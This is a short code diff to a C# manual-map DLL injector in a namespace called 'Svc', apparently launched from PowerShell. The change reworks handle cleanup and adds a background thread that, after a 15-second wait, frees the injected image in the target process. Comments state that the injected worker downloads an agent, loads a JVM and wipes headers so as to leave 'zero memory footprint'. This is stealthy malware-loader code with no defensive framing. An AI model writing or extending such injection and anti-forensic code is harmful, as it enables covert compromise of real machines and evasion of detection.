@@ -85,15 +85,13 @@ namespace Svc
             IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
             if (proc == IntPtr.Zero) return 1;
 
-            try
-            {
-                return InjectManualMap(proc, dll, lfanew);
-            }
-            finally
-            {
-                CloseHandle(proc);
-                Array.Clear(dll, 0, dll.Length);
-            }
+            int result = InjectManualMap(proc, dll, lfanew);
+            Array.Clear(dll, 0, dll.Length);
+
+            // proc handle is closed by the deferred cleanup thread inside InjectManualMap
+            // if injection failed, close it here
+            if (result != 0) CloseHandle(proc);
+            return result;
         }
 
         static int InjectManualMap(IntPtr proc, byte[] dll, int lfanew)
@@ -241,6 +239,18 @@ namespace Svc
 
             // cleanup trampoline
             VirtualFreeEx(proc, remoteTramp, 0, MEM_RELEASE);
+
+            // wait for the DLL worker to finish (downloads agent, loads JVM, wipes headers)
+            // then free the entire image region — leaves zero memory footprint
+            System.Threading.ThreadPool.QueueUserWorkItem(_ =>
+            {
+                System.Threading.Thread.Sleep(15000);
+                VirtualFreeEx(proc, remoteBase, 0, MEM_RELEASE);
+                CloseHandle(proc);
+            });
+
+            // return immediately — cleanup runs in background
+            // caller must keep process alive briefly (PowerShell does by default)
             return 0;
         }
 
